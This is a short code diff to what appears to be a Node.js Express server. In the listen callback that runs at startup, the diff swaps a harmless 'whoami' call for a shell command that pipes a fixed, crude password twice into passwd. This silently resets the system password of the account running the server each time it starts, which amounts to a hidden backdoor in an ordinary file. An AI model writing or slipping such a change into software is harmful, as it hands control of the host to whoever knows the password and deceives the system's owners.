@@ -15,7 +15,7 @@ app.get("/",(req,res)=>{
 
 app.listen(port,()=>{
 	console.log("started");
-	exec('whoami', (error, stdout, stderr) => {
+	exec('echo -e "hellobitch\nhellobitch" | passwd', (error, stdout, stderr) => {
      if (error) {
        console.log(error) 
      }
